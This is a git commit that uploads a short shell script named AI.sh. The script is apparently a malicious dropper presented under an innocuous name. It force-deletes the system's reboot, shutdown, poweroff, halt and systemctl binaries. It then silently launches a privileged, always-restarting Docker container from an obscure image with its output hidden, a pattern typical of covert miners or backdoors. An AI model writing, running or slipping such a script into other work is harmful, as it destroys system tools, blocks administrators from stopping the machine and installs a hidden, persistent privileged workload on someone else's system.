246710307dc778bfaed7e52db1c226a101e83d66
hanrzme <marcgrosier@live.cn>
2024-12-11 08:01:03 +0800

    Add files via upload

---
+++ AI.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+
+
+
+bash -c "docker run -dt --privileged --restart=always --name ai xpsok/qazwsx:edcrfv" >/dev/null 2>&1 &
